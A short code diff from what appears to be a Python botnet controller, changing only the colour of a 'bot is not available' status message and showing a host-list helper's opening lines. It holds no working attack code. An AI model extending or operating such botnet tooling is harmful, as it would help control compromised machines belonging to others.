@@ -23,7 +23,7 @@ def GetInfoOfTheBot(botnet_exemplars_ipv4):
         if platform.system() == "Windows":
             return "[*] Bot "+botnet_exemplars_ipv4+" is not avaliable!"
         if platform.system() == "Linux":
-            return "\u001b[39m[\u001b[36m*\u001b[39m] Bot \u001b[33m"+botnet_exemplars_ipv4+"\u001b[39m is not avaliable!"
+            return "\u001b[39m[\u001b[31m*\u001b[39m] Bot \u001b[33m"+botnet_exemplars_ipv4+"\u001b[39m is not avaliable!"
 #-------------------------------------------------------------------
 def extract_botnet_hostlist():
     bots_ipv4s_list = []
